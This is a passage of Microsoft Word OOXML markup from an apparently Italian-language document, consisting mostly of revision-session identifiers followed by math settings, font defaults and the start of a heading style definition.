    <w:rsid w:val="002060B8"/>
    <w:rsid w:val="0020709D"/>
    <w:rsid w:val="00210F7A"/>
    <w:rsid w:val="00211A7F"/>
    <w:rsid w:val="0021431D"/>
    <w:rsid w:val="00215A08"/>
    <w:rsid w:val="00221734"/>
    <w:rsid w:val="002233C7"/>
    <w:rsid w:val="002259D9"/>
    <w:rsid w:val="00226897"/>
    <w:rsid w:val="00236148"/>
    <w:rsid w:val="0023748A"/>
    <w:rsid w:val="00237BE1"/>
    <w:rsid w:val="00251609"/>
    <w:rsid w:val="00253589"/>
    <w:rsid w:val="002549E9"/>
    <w:rsid w:val="00257ECB"/>
    <w:rsid w:val="0026151C"/>
    <w:rsid w:val="00262790"/>
    <w:rsid w:val="0026498F"/>
    <w:rsid w:val="002663F0"/>
    <w:rsid w:val="00270DE5"/>
    <w:rsid w:val="00280B56"/>
    <w:rsid w:val="00280B61"/>
    <w:rsid w:val="00281750"/>
    <w:rsid w:val="00284304"/>
    <w:rsid w:val="00285304"/>
    <w:rsid w:val="00287B8E"/>
    <w:rsid w:val="002910B6"/>
    <w:rsid w:val="00292D63"/>
    <w:rsid w:val="00292E5C"/>
    <w:rsid w:val="002A2987"/>
    <w:rsid w:val="002B029A"/>
    <w:rsid w:val="002B19FB"/>
    <w:rsid w:val="002B1EC9"/>
    <w:rsid w:val="002B43B5"/>
    <w:rsid w:val="002B7A38"/>
    <w:rsid w:val="002C0B23"/>
    <w:rsid w:val="002C4BC5"/>
    <w:rsid w:val="002C4FEB"/>
    <w:rsid w:val="002C6AF0"/>
    <w:rsid w:val="002C6EAF"/>
    <w:rsid w:val="002D0C20"/>
    <w:rsid w:val="002D24E4"/>
    <w:rsid w:val="002D5040"/>
    <w:rsid w:val="002D523D"/>
    <w:rsid w:val="002D6D68"/>
    <w:rsid w:val="002D78D4"/>
    <w:rsid w:val="002E6167"/>
    <w:rsid w:val="002F013F"/>
    <w:rsid w:val="002F4FB3"/>
    <w:rsid w:val="002F5849"/>
    <w:rsid w:val="002F6DA0"/>
    <w:rsid w:val="002F76F5"/>
    <w:rsid w:val="00300339"/>
    <w:rsid w:val="00301ECC"/>
    <w:rsid w:val="0030281F"/>
    <w:rsid w:val="00312339"/>
    <w:rsid w:val="00312DF7"/>
    <w:rsid w:val="00316AF6"/>
    <w:rsid w:val="00317D47"/>
    <w:rsid w:val="0032467E"/>
    <w:rsid w:val="00324963"/>
    <w:rsid w:val="00333357"/>
    <w:rsid w:val="0034012A"/>
    <w:rsid w:val="0034207F"/>
    <w:rsid w:val="00344C2C"/>
    <w:rsid w:val="00350A9E"/>
    <w:rsid w:val="00355045"/>
    <w:rsid w:val="0035798C"/>
    <w:rsid w:val="00363131"/>
    <w:rsid w:val="00366B51"/>
    <w:rsid w:val="00370C11"/>
    <w:rsid w:val="003762BE"/>
    <w:rsid w:val="00376E31"/>
    <w:rsid w:val="00382D55"/>
    <w:rsid w:val="00383FA8"/>
    <w:rsid w:val="00387971"/>
    <w:rsid w:val="0039038C"/>
    <w:rsid w:val="00391D57"/>
    <w:rsid w:val="00392C08"/>
    <w:rsid w:val="003949B5"/>
    <w:rsid w:val="0039639B"/>
    <w:rsid w:val="00396772"/>
    <w:rsid w:val="00397EE5"/>
    <w:rsid w:val="003A09A6"/>
    <w:rsid w:val="003A2011"/>
    <w:rsid w:val="003A253A"/>
    <w:rsid w:val="003A6BFE"/>
    <w:rsid w:val="003A7F6C"/>
    <w:rsid w:val="003B439A"/>
    <w:rsid w:val="003B5B8D"/>
    <w:rsid w:val="003B5E47"/>
    <w:rsid w:val="003B74CA"/>
    <w:rsid w:val="003C0F24"/>
    <w:rsid w:val="003C1176"/>
    <w:rsid w:val="003C1260"/>
    <w:rsid w:val="003C1720"/>
    <w:rsid w:val="003C1E14"/>
    <w:rsid w:val="003C3047"/>
    <w:rsid w:val="003D515F"/>
    <w:rsid w:val="003D53AE"/>
    <w:rsid w:val="003D59ED"/>
    <w:rsid w:val="003D5C73"/>
    <w:rsid w:val="003E3349"/>
    <w:rsid w:val="003E3AE3"/>
    <w:rsid w:val="003E7EF0"/>
    <w:rsid w:val="003F4438"/>
    <w:rsid w:val="003F4BEE"/>
    <w:rsid w:val="003F5AF1"/>
    <w:rsid w:val="003F7C44"/>
    <w:rsid w:val="004027F3"/>
    <w:rsid w:val="004039E1"/>
    <w:rsid w:val="004045EF"/>
    <w:rsid w:val="004050EB"/>
    <w:rsid w:val="0041605A"/>
    <w:rsid w:val="00425889"/>
    <w:rsid w:val="00432042"/>
    <w:rsid w:val="0043600A"/>
    <w:rsid w:val="00436BF2"/>
    <w:rsid w:val="0044118A"/>
    <w:rsid w:val="0044295D"/>
    <w:rsid w:val="00445E86"/>
    <w:rsid w:val="0045258B"/>
    <w:rsid w:val="004533DD"/>
    <w:rsid w:val="00455211"/>
    <w:rsid w:val="004626BE"/>
    <w:rsid w:val="00470C5B"/>
    <w:rsid w:val="00476970"/>
    <w:rsid w:val="00480D1B"/>
    <w:rsid w:val="00482E5B"/>
    <w:rsid w:val="004842A4"/>
    <w:rsid w:val="004A2227"/>
    <w:rsid w:val="004A3D26"/>
    <w:rsid w:val="004A4153"/>
    <w:rsid w:val="004A46D8"/>
    <w:rsid w:val="004A6B68"/>
    <w:rsid w:val="004B2438"/>
    <w:rsid w:val="004B34CE"/>
    <w:rsid w:val="004B6C30"/>
    <w:rsid w:val="004B7B6E"/>
    <w:rsid w:val="004C1FD9"/>
    <w:rsid w:val="004D50F3"/>
    <w:rsid w:val="004D6615"/>
    <w:rsid w:val="004E7FC7"/>
    <w:rsid w:val="004F0353"/>
    <w:rsid w:val="004F1E9D"/>
    <w:rsid w:val="004F2C9D"/>
    <w:rsid w:val="004F31E3"/>
    <w:rsid w:val="004F3CF2"/>
    <w:rsid w:val="004F514A"/>
    <w:rsid w:val="004F6295"/>
    <w:rsid w:val="005025F4"/>
    <w:rsid w:val="00511CCC"/>
    <w:rsid w:val="0051295E"/>
    <w:rsid w:val="005160E2"/>
    <w:rsid w:val="00516A01"/>
    <w:rsid w:val="00523458"/>
    <w:rsid w:val="0052613E"/>
    <w:rsid w:val="00532CC3"/>
    <w:rsid w:val="0054195E"/>
    <w:rsid w:val="005432B6"/>
    <w:rsid w:val="0054385A"/>
    <w:rsid w:val="00543DE3"/>
    <w:rsid w:val="00543F22"/>
    <w:rsid w:val="0055354A"/>
    <w:rsid w:val="0055386A"/>
    <w:rsid w:val="00554223"/>
    <w:rsid w:val="005574DE"/>
    <w:rsid w:val="0055761A"/>
    <w:rsid w:val="0056298B"/>
    <w:rsid w:val="00574B26"/>
    <w:rsid w:val="00577E84"/>
    <w:rsid w:val="005803B2"/>
    <w:rsid w:val="00582E72"/>
    <w:rsid w:val="0058650B"/>
    <w:rsid w:val="005936A5"/>
    <w:rsid w:val="0059664B"/>
    <w:rsid w:val="00596BEF"/>
    <w:rsid w:val="005B1B25"/>
    <w:rsid w:val="005B2D54"/>
    <w:rsid w:val="005B308A"/>
    <w:rsid w:val="005C044C"/>
    <w:rsid w:val="005C092C"/>
    <w:rsid w:val="005C4C54"/>
    <w:rsid w:val="005C50D3"/>
    <w:rsid w:val="005D5994"/>
    <w:rsid w:val="005E0DD2"/>
    <w:rsid w:val="005E22AC"/>
    <w:rsid w:val="005E29C4"/>
    <w:rsid w:val="005E3D08"/>
    <w:rsid w:val="005E4FEC"/>
    <w:rsid w:val="005F43BC"/>
    <w:rsid w:val="005F5395"/>
    <w:rsid w:val="005F5AAC"/>
    <w:rsid w:val="00607A99"/>
    <w:rsid w:val="00623027"/>
    <w:rsid w:val="00623194"/>
    <w:rsid w:val="00624A58"/>
    <w:rsid w:val="00624E29"/>
    <w:rsid w:val="00636CFF"/>
    <w:rsid w:val="00641753"/>
    <w:rsid w:val="00642297"/>
    <w:rsid w:val="00650DE0"/>
    <w:rsid w:val="00651B31"/>
    <w:rsid w:val="006629C7"/>
    <w:rsid w:val="00663092"/>
    <w:rsid w:val="00664048"/>
    <w:rsid w:val="00670045"/>
    <w:rsid w:val="00671183"/>
    <w:rsid w:val="00673E3B"/>
    <w:rsid w:val="00681E6C"/>
    <w:rsid w:val="00684C32"/>
    <w:rsid w:val="00684D96"/>
    <w:rsid w:val="006906EC"/>
    <w:rsid w:val="00691675"/>
    <w:rsid w:val="006940D4"/>
    <w:rsid w:val="00696BF4"/>
    <w:rsid w:val="006A4391"/>
    <w:rsid w:val="006B3DFB"/>
    <w:rsid w:val="006C269C"/>
    <w:rsid w:val="006C5C46"/>
    <w:rsid w:val="006D2376"/>
    <w:rsid w:val="006D3713"/>
    <w:rsid w:val="006E126C"/>
    <w:rsid w:val="006F1E7A"/>
    <w:rsid w:val="00700578"/>
    <w:rsid w:val="00701DE2"/>
    <w:rsid w:val="007026E9"/>
    <w:rsid w:val="0070309B"/>
    <w:rsid w:val="00705F2C"/>
    <w:rsid w:val="00707957"/>
    <w:rsid w:val="00707DDE"/>
    <w:rsid w:val="00712926"/>
    <w:rsid w:val="00712B29"/>
    <w:rsid w:val="00714182"/>
    <w:rsid w:val="00723F2E"/>
    <w:rsid w:val="00725916"/>
    <w:rsid w:val="007307C0"/>
    <w:rsid w:val="00733FFF"/>
    <w:rsid w:val="00734D45"/>
    <w:rsid w:val="00743CE2"/>
    <w:rsid w:val="00745A92"/>
    <w:rsid w:val="00745B70"/>
    <w:rsid w:val="0075005F"/>
    <w:rsid w:val="00752B14"/>
    <w:rsid w:val="00754BC2"/>
    <w:rsid w:val="007565B1"/>
    <w:rsid w:val="007565B7"/>
    <w:rsid w:val="007570E7"/>
    <w:rsid w:val="007610F9"/>
    <w:rsid w:val="00762BB7"/>
    <w:rsid w:val="00762EE1"/>
    <w:rsid w:val="00763427"/>
    <w:rsid w:val="00765BBE"/>
    <w:rsid w:val="0076668E"/>
    <w:rsid w:val="00767840"/>
    <w:rsid w:val="007712C3"/>
    <w:rsid w:val="00771331"/>
    <w:rsid w:val="0077441F"/>
    <w:rsid w:val="00776E8E"/>
    <w:rsid w:val="00777537"/>
    <w:rsid w:val="007808E7"/>
    <w:rsid w:val="007831CD"/>
    <w:rsid w:val="00783452"/>
    <w:rsid w:val="00783675"/>
    <w:rsid w:val="00784009"/>
    <w:rsid w:val="00786DAB"/>
    <w:rsid w:val="00795E42"/>
    <w:rsid w:val="00795FAB"/>
    <w:rsid w:val="007A36F2"/>
    <w:rsid w:val="007A4672"/>
    <w:rsid w:val="007A5EB6"/>
    <w:rsid w:val="007A6E48"/>
    <w:rsid w:val="007A7970"/>
    <w:rsid w:val="007A7C2B"/>
    <w:rsid w:val="007B2EE0"/>
    <w:rsid w:val="007B564E"/>
    <w:rsid w:val="007B651F"/>
    <w:rsid w:val="007C4A14"/>
    <w:rsid w:val="007C772F"/>
    <w:rsid w:val="007D0544"/>
    <w:rsid w:val="007D0EAD"/>
    <w:rsid w:val="007D1165"/>
    <w:rsid w:val="007D4A59"/>
    <w:rsid w:val="007D5E38"/>
    <w:rsid w:val="007D6F0C"/>
    <w:rsid w:val="007E03EE"/>
    <w:rsid w:val="007E0E00"/>
    <w:rsid w:val="007E2E57"/>
    <w:rsid w:val="007E3053"/>
    <w:rsid w:val="007E690D"/>
    <w:rsid w:val="007F07DF"/>
    <w:rsid w:val="007F16A6"/>
    <w:rsid w:val="007F4C68"/>
    <w:rsid w:val="007F533B"/>
    <w:rsid w:val="008021AE"/>
    <w:rsid w:val="0080595D"/>
    <w:rsid w:val="00805DC0"/>
    <w:rsid w:val="00805FC4"/>
    <w:rsid w:val="00807749"/>
    <w:rsid w:val="00810893"/>
    <w:rsid w:val="008121CB"/>
    <w:rsid w:val="0081493F"/>
    <w:rsid w:val="0081556C"/>
    <w:rsid w:val="0081574A"/>
    <w:rsid w:val="00820A55"/>
    <w:rsid w:val="008231A3"/>
    <w:rsid w:val="00832107"/>
    <w:rsid w:val="008357D5"/>
    <w:rsid w:val="0084286E"/>
    <w:rsid w:val="00846820"/>
    <w:rsid w:val="00850276"/>
    <w:rsid w:val="00852A21"/>
    <w:rsid w:val="00854201"/>
    <w:rsid w:val="008556F9"/>
    <w:rsid w:val="00856B62"/>
    <w:rsid w:val="0086073F"/>
    <w:rsid w:val="00861D93"/>
    <w:rsid w:val="008633E4"/>
    <w:rsid w:val="008642B6"/>
    <w:rsid w:val="00871FA9"/>
    <w:rsid w:val="00872300"/>
    <w:rsid w:val="00872311"/>
    <w:rsid w:val="008729A0"/>
    <w:rsid w:val="008731D6"/>
    <w:rsid w:val="00875EF3"/>
    <w:rsid w:val="00875F24"/>
    <w:rsid w:val="00877B70"/>
    <w:rsid w:val="008809F7"/>
    <w:rsid w:val="008827B5"/>
    <w:rsid w:val="00882917"/>
    <w:rsid w:val="00885A7E"/>
    <w:rsid w:val="00885FCB"/>
    <w:rsid w:val="008861D8"/>
    <w:rsid w:val="00886882"/>
    <w:rsid w:val="00886CE8"/>
    <w:rsid w:val="00890181"/>
    <w:rsid w:val="0089734C"/>
    <w:rsid w:val="008A2FFF"/>
    <w:rsid w:val="008A46CE"/>
    <w:rsid w:val="008A46D7"/>
    <w:rsid w:val="008A62CD"/>
    <w:rsid w:val="008A6A2B"/>
    <w:rsid w:val="008A73D0"/>
    <w:rsid w:val="008B12C1"/>
    <w:rsid w:val="008B2DB7"/>
    <w:rsid w:val="008B692C"/>
    <w:rsid w:val="008C1592"/>
    <w:rsid w:val="008C38A3"/>
    <w:rsid w:val="008C43A6"/>
    <w:rsid w:val="008C5B3F"/>
    <w:rsid w:val="008C7198"/>
    <w:rsid w:val="008D46DD"/>
    <w:rsid w:val="008D4BD2"/>
    <w:rsid w:val="008D6A85"/>
    <w:rsid w:val="008E2101"/>
    <w:rsid w:val="008E38C4"/>
    <w:rsid w:val="008F181E"/>
    <w:rsid w:val="008F3E50"/>
    <w:rsid w:val="008F599F"/>
    <w:rsid w:val="008F768B"/>
    <w:rsid w:val="00900930"/>
    <w:rsid w:val="0090472F"/>
    <w:rsid w:val="00906C68"/>
    <w:rsid w:val="00910649"/>
    <w:rsid w:val="00910B84"/>
    <w:rsid w:val="0091565B"/>
    <w:rsid w:val="00916779"/>
    <w:rsid w:val="00917B3D"/>
    <w:rsid w:val="009207A3"/>
    <w:rsid w:val="00925E18"/>
    <w:rsid w:val="009274EB"/>
    <w:rsid w:val="00930D36"/>
    <w:rsid w:val="0093129D"/>
    <w:rsid w:val="00931EAF"/>
    <w:rsid w:val="009341EB"/>
    <w:rsid w:val="0093761E"/>
    <w:rsid w:val="00940388"/>
    <w:rsid w:val="00940B30"/>
    <w:rsid w:val="00941D04"/>
    <w:rsid w:val="00944127"/>
    <w:rsid w:val="009517E5"/>
    <w:rsid w:val="00952A2F"/>
    <w:rsid w:val="00954CBE"/>
    <w:rsid w:val="00955235"/>
    <w:rsid w:val="00956A55"/>
    <w:rsid w:val="009666C5"/>
    <w:rsid w:val="00971E67"/>
    <w:rsid w:val="009832FE"/>
    <w:rsid w:val="00987B51"/>
    <w:rsid w:val="00987EA1"/>
    <w:rsid w:val="00993D80"/>
    <w:rsid w:val="0099774D"/>
    <w:rsid w:val="009A055A"/>
    <w:rsid w:val="009A577D"/>
    <w:rsid w:val="009A75FF"/>
    <w:rsid w:val="009A785F"/>
    <w:rsid w:val="009B62F3"/>
    <w:rsid w:val="009B6B9E"/>
    <w:rsid w:val="009B7421"/>
    <w:rsid w:val="009C0892"/>
    <w:rsid w:val="009C1073"/>
    <w:rsid w:val="009C4CB4"/>
    <w:rsid w:val="009C516E"/>
    <w:rsid w:val="009C680D"/>
    <w:rsid w:val="009C68E0"/>
    <w:rsid w:val="009C72EC"/>
    <w:rsid w:val="009D448A"/>
    <w:rsid w:val="009D6FB8"/>
    <w:rsid w:val="009D7876"/>
    <w:rsid w:val="009E0CF7"/>
    <w:rsid w:val="009E1274"/>
    <w:rsid w:val="009E77ED"/>
    <w:rsid w:val="009F0B80"/>
    <w:rsid w:val="009F0F6B"/>
    <w:rsid w:val="009F110F"/>
    <w:rsid w:val="009F21E6"/>
    <w:rsid w:val="009F44CA"/>
    <w:rsid w:val="009F5286"/>
    <w:rsid w:val="00A00BED"/>
    <w:rsid w:val="00A10478"/>
    <w:rsid w:val="00A10778"/>
    <w:rsid w:val="00A10FFC"/>
    <w:rsid w:val="00A13121"/>
    <w:rsid w:val="00A15C3A"/>
    <w:rsid w:val="00A23FFF"/>
    <w:rsid w:val="00A2556E"/>
    <w:rsid w:val="00A32458"/>
    <w:rsid w:val="00A3267A"/>
    <w:rsid w:val="00A35D53"/>
    <w:rsid w:val="00A4095F"/>
    <w:rsid w:val="00A440B4"/>
    <w:rsid w:val="00A4672E"/>
    <w:rsid w:val="00A53A13"/>
    <w:rsid w:val="00A54AD7"/>
    <w:rsid w:val="00A54EBB"/>
    <w:rsid w:val="00A55A3E"/>
    <w:rsid w:val="00A60534"/>
    <w:rsid w:val="00A62107"/>
    <w:rsid w:val="00A65F51"/>
    <w:rsid w:val="00A67A79"/>
    <w:rsid w:val="00A7173C"/>
    <w:rsid w:val="00A72CE1"/>
    <w:rsid w:val="00A7305A"/>
    <w:rsid w:val="00A7439F"/>
    <w:rsid w:val="00A749D5"/>
    <w:rsid w:val="00A8326F"/>
    <w:rsid w:val="00A85275"/>
    <w:rsid w:val="00A8535B"/>
    <w:rsid w:val="00A87181"/>
    <w:rsid w:val="00A910B2"/>
    <w:rsid w:val="00A92AD0"/>
    <w:rsid w:val="00A92DE1"/>
    <w:rsid w:val="00A92EAD"/>
    <w:rsid w:val="00A979AF"/>
    <w:rsid w:val="00AA2C11"/>
    <w:rsid w:val="00AA4FE6"/>
    <w:rsid w:val="00AA6B09"/>
    <w:rsid w:val="00AA7AAC"/>
    <w:rsid w:val="00AB0644"/>
    <w:rsid w:val="00AB25CE"/>
    <w:rsid w:val="00AB646D"/>
    <w:rsid w:val="00AC0849"/>
    <w:rsid w:val="00AC0B75"/>
    <w:rsid w:val="00AC0C22"/>
    <w:rsid w:val="00AC2853"/>
    <w:rsid w:val="00AC4DEE"/>
    <w:rsid w:val="00AC669A"/>
    <w:rsid w:val="00AC7E75"/>
    <w:rsid w:val="00AD7B7C"/>
    <w:rsid w:val="00AE15A0"/>
    <w:rsid w:val="00AE2CAE"/>
    <w:rsid w:val="00AE2DA2"/>
    <w:rsid w:val="00AE3DDE"/>
    <w:rsid w:val="00AE55AB"/>
    <w:rsid w:val="00AF1A77"/>
    <w:rsid w:val="00AF213E"/>
    <w:rsid w:val="00AF30FA"/>
    <w:rsid w:val="00B006A0"/>
    <w:rsid w:val="00B06F76"/>
    <w:rsid w:val="00B141FC"/>
    <w:rsid w:val="00B2259C"/>
    <w:rsid w:val="00B225EF"/>
    <w:rsid w:val="00B2318D"/>
    <w:rsid w:val="00B26872"/>
    <w:rsid w:val="00B26DAA"/>
    <w:rsid w:val="00B27923"/>
    <w:rsid w:val="00B4086D"/>
    <w:rsid w:val="00B42D35"/>
    <w:rsid w:val="00B445E4"/>
    <w:rsid w:val="00B46A9E"/>
    <w:rsid w:val="00B52EA8"/>
    <w:rsid w:val="00B61417"/>
    <w:rsid w:val="00B61614"/>
    <w:rsid w:val="00B628CB"/>
    <w:rsid w:val="00B86563"/>
    <w:rsid w:val="00B868A2"/>
    <w:rsid w:val="00B87665"/>
    <w:rsid w:val="00B87D30"/>
    <w:rsid w:val="00B926C0"/>
    <w:rsid w:val="00B94FF3"/>
    <w:rsid w:val="00B950F1"/>
    <w:rsid w:val="00B97E7E"/>
    <w:rsid w:val="00BA2C74"/>
    <w:rsid w:val="00BB1AB1"/>
    <w:rsid w:val="00BC2AC1"/>
    <w:rsid w:val="00BC4A6B"/>
    <w:rsid w:val="00BC6ED6"/>
    <w:rsid w:val="00BD28A0"/>
    <w:rsid w:val="00BD2984"/>
    <w:rsid w:val="00BD4BC4"/>
    <w:rsid w:val="00BD5074"/>
    <w:rsid w:val="00BD7EFB"/>
    <w:rsid w:val="00BE600F"/>
    <w:rsid w:val="00BE6452"/>
    <w:rsid w:val="00BE7A3D"/>
    <w:rsid w:val="00BF1490"/>
    <w:rsid w:val="00BF5DDB"/>
    <w:rsid w:val="00BF6C00"/>
    <w:rsid w:val="00C06BD4"/>
    <w:rsid w:val="00C1052E"/>
    <w:rsid w:val="00C10AFD"/>
    <w:rsid w:val="00C15FF8"/>
    <w:rsid w:val="00C172B6"/>
    <w:rsid w:val="00C17A64"/>
    <w:rsid w:val="00C27C08"/>
    <w:rsid w:val="00C33E25"/>
    <w:rsid w:val="00C43F62"/>
    <w:rsid w:val="00C45626"/>
    <w:rsid w:val="00C5301C"/>
    <w:rsid w:val="00C56735"/>
    <w:rsid w:val="00C57B8A"/>
    <w:rsid w:val="00C618B0"/>
    <w:rsid w:val="00C62479"/>
    <w:rsid w:val="00C627D8"/>
    <w:rsid w:val="00C639D5"/>
    <w:rsid w:val="00C63C9B"/>
    <w:rsid w:val="00C64AAA"/>
    <w:rsid w:val="00C70251"/>
    <w:rsid w:val="00C75E40"/>
    <w:rsid w:val="00C77DD3"/>
    <w:rsid w:val="00C83839"/>
    <w:rsid w:val="00C842DA"/>
    <w:rsid w:val="00C85E1C"/>
    <w:rsid w:val="00C87C63"/>
    <w:rsid w:val="00C93211"/>
    <w:rsid w:val="00C94C63"/>
    <w:rsid w:val="00C96367"/>
    <w:rsid w:val="00C976C3"/>
    <w:rsid w:val="00CA7453"/>
    <w:rsid w:val="00CA75BA"/>
    <w:rsid w:val="00CA7885"/>
    <w:rsid w:val="00CB033D"/>
    <w:rsid w:val="00CB0455"/>
    <w:rsid w:val="00CB43FA"/>
    <w:rsid w:val="00CB51F8"/>
    <w:rsid w:val="00CC0CFD"/>
    <w:rsid w:val="00CC5073"/>
    <w:rsid w:val="00CC7E01"/>
    <w:rsid w:val="00CD7EC8"/>
    <w:rsid w:val="00CE112A"/>
    <w:rsid w:val="00CE3B71"/>
    <w:rsid w:val="00CE723D"/>
    <w:rsid w:val="00CE78FD"/>
    <w:rsid w:val="00CF2251"/>
    <w:rsid w:val="00CF65A7"/>
    <w:rsid w:val="00CF7D39"/>
    <w:rsid w:val="00D01138"/>
    <w:rsid w:val="00D02134"/>
    <w:rsid w:val="00D03727"/>
    <w:rsid w:val="00D04427"/>
    <w:rsid w:val="00D21676"/>
    <w:rsid w:val="00D300C7"/>
    <w:rsid w:val="00D303B9"/>
    <w:rsid w:val="00D30E89"/>
    <w:rsid w:val="00D33472"/>
    <w:rsid w:val="00D33DC7"/>
    <w:rsid w:val="00D35B60"/>
    <w:rsid w:val="00D40756"/>
    <w:rsid w:val="00D437AA"/>
    <w:rsid w:val="00D43D8E"/>
    <w:rsid w:val="00D464C1"/>
    <w:rsid w:val="00D510DF"/>
    <w:rsid w:val="00D5268F"/>
    <w:rsid w:val="00D53FEB"/>
    <w:rsid w:val="00D552A0"/>
    <w:rsid w:val="00D63111"/>
    <w:rsid w:val="00D7064F"/>
    <w:rsid w:val="00D81BE1"/>
    <w:rsid w:val="00D85C17"/>
    <w:rsid w:val="00D870E5"/>
    <w:rsid w:val="00D87368"/>
    <w:rsid w:val="00D9195C"/>
    <w:rsid w:val="00D91CD1"/>
    <w:rsid w:val="00D95049"/>
    <w:rsid w:val="00DA4E23"/>
    <w:rsid w:val="00DB1B51"/>
    <w:rsid w:val="00DB1DFD"/>
    <w:rsid w:val="00DB5705"/>
    <w:rsid w:val="00DB6FCE"/>
    <w:rsid w:val="00DD6EF0"/>
    <w:rsid w:val="00DE0AE2"/>
    <w:rsid w:val="00DE2278"/>
    <w:rsid w:val="00DF0A54"/>
    <w:rsid w:val="00DF0BE4"/>
    <w:rsid w:val="00E050A3"/>
    <w:rsid w:val="00E0537F"/>
    <w:rsid w:val="00E11119"/>
    <w:rsid w:val="00E12300"/>
    <w:rsid w:val="00E12537"/>
    <w:rsid w:val="00E1277A"/>
    <w:rsid w:val="00E1500E"/>
    <w:rsid w:val="00E16334"/>
    <w:rsid w:val="00E21C86"/>
    <w:rsid w:val="00E268AF"/>
    <w:rsid w:val="00E33216"/>
    <w:rsid w:val="00E35507"/>
    <w:rsid w:val="00E35F4F"/>
    <w:rsid w:val="00E45938"/>
    <w:rsid w:val="00E45EEC"/>
    <w:rsid w:val="00E51496"/>
    <w:rsid w:val="00E52210"/>
    <w:rsid w:val="00E528BC"/>
    <w:rsid w:val="00E551EB"/>
    <w:rsid w:val="00E553C7"/>
    <w:rsid w:val="00E55FC0"/>
    <w:rsid w:val="00E61244"/>
    <w:rsid w:val="00E64786"/>
    <w:rsid w:val="00E73A00"/>
    <w:rsid w:val="00E91597"/>
    <w:rsid w:val="00E95CD2"/>
    <w:rsid w:val="00E96519"/>
    <w:rsid w:val="00E96BFD"/>
    <w:rsid w:val="00E97A66"/>
    <w:rsid w:val="00EA135B"/>
    <w:rsid w:val="00EA30B4"/>
    <w:rsid w:val="00EA35CB"/>
    <w:rsid w:val="00EA6557"/>
    <w:rsid w:val="00EB49AD"/>
    <w:rsid w:val="00EB4E88"/>
    <w:rsid w:val="00EB6C83"/>
    <w:rsid w:val="00EC0A3B"/>
    <w:rsid w:val="00EC1AA7"/>
    <w:rsid w:val="00EC5093"/>
    <w:rsid w:val="00EC5AA6"/>
    <w:rsid w:val="00ED19AA"/>
    <w:rsid w:val="00ED31AA"/>
    <w:rsid w:val="00ED5BCC"/>
    <w:rsid w:val="00EE30D7"/>
    <w:rsid w:val="00EE5E58"/>
    <w:rsid w:val="00EE7FC5"/>
    <w:rsid w:val="00EF6A94"/>
    <w:rsid w:val="00EF7393"/>
    <w:rsid w:val="00F0016B"/>
    <w:rsid w:val="00F03AB8"/>
    <w:rsid w:val="00F05668"/>
    <w:rsid w:val="00F13B6A"/>
    <w:rsid w:val="00F16273"/>
    <w:rsid w:val="00F164EF"/>
    <w:rsid w:val="00F17122"/>
    <w:rsid w:val="00F2029A"/>
    <w:rsid w:val="00F22F73"/>
    <w:rsid w:val="00F3169B"/>
    <w:rsid w:val="00F327A2"/>
    <w:rsid w:val="00F37A12"/>
    <w:rsid w:val="00F4001F"/>
    <w:rsid w:val="00F47527"/>
    <w:rsid w:val="00F50F56"/>
    <w:rsid w:val="00F5278A"/>
    <w:rsid w:val="00F528AB"/>
    <w:rsid w:val="00F57E0E"/>
    <w:rsid w:val="00F613EB"/>
    <w:rsid w:val="00F63DB6"/>
    <w:rsid w:val="00F71E4F"/>
    <w:rsid w:val="00F72F92"/>
    <w:rsid w:val="00F75AE3"/>
    <w:rsid w:val="00F77BCB"/>
    <w:rsid w:val="00F8071C"/>
    <w:rsid w:val="00F839C0"/>
    <w:rsid w:val="00F85136"/>
    <w:rsid w:val="00F85A93"/>
    <w:rsid w:val="00F86545"/>
    <w:rsid w:val="00F8736B"/>
    <w:rsid w:val="00F9012E"/>
    <w:rsid w:val="00F91D86"/>
    <w:rsid w:val="00FA0731"/>
    <w:rsid w:val="00FA32F2"/>
    <w:rsid w:val="00FA70A1"/>
    <w:rsid w:val="00FB12D6"/>
    <w:rsid w:val="00FB20D7"/>
    <w:rsid w:val="00FC25FD"/>
    <w:rsid w:val="00FD5194"/>
    <w:rsid w:val="00FD55A0"/>
    <w:rsid w:val="00FD6F82"/>
    <w:rsid w:val="00FE160B"/>
    <w:rsid w:val="00FE2E9A"/>
    <w:rsid w:val="00FE6C60"/>
    <w:rsid w:val="00FF1436"/>
    <w:rsid w:val="00FF22F3"/>
    <w:rsid w:val="00FF6931"/>
    <w:rsid w:val="00FF7331"/>
    <w:rsid w:val="0410EDEC"/>
    <w:rsid w:val="05202EC1"/>
    <w:rsid w:val="0A8760BD"/>
    <w:rsid w:val="0B9DF8C6"/>
    <w:rsid w:val="120B4243"/>
    <w:rsid w:val="214AC69F"/>
    <w:rsid w:val="21B119F5"/>
    <w:rsid w:val="2552E73E"/>
    <w:rsid w:val="3014559B"/>
    <w:rsid w:val="44874A47"/>
    <w:rsid w:val="458F8585"/>
    <w:rsid w:val="4629724E"/>
    <w:rsid w:val="4E46F641"/>
    <w:rsid w:val="500A681F"/>
    <w:rsid w:val="5C8ABD5F"/>
    <w:rsid w:val="6498005D"/>
    <w:rsid w:val="663E56B0"/>
    <w:rsid w:val="75DF7979"/>
    <w:rsid w:val="7EBD873A"/>
  </w:rsids>
  <m:mathPr>
    <m:mathFont m:val="Cambria Math"/>
    <m:brkBin m:val="before"/>
    <m:brkBinSub m:val="--"/>
    <m:smallFrac m:val="0"/>
    <m:dispDef/>
    <m:lMargin m:val="0"/>
    <m:rMargin m:val="0"/>
    <m:defJc m:val="centerGroup"/>
    <m:wrapIndent m:val="1440"/>
    <m:intLim m:val="subSup"/>
    <m:naryLim m:val="undOvr"/>
  </m:mathPr>
  <w:themeFontLang w:val="it-IT"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C4FDFD"/>
  <w15:docId w15:val="{4B5DF4D8-BB30-4434-BE8C-7BF041957C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Lucida Sans" w:eastAsia="Lucida Sans" w:hAnsi="Lucida Sans" w:cs="Lucida Sans"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
        <w:lang w:val="it" w:eastAsia="ja-JP" w:bidi="ar-SA"/>
      </w:rPr>
    </w:rPrDefault>
    <w:pPrDefault>
      <w:pPr>
        <w:spacing w:before="240" w:after="24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1F114B"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00886CE8"/>
    <w:pPr>
      <w:pageBreakBefore/>
      <w:numPr>
        <w:numId w:val="4"/>
      </w:numPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="36" w:space="3" w:color="808080"/>
      </w:pBdr>
      <w:spacing w:before="0"/>
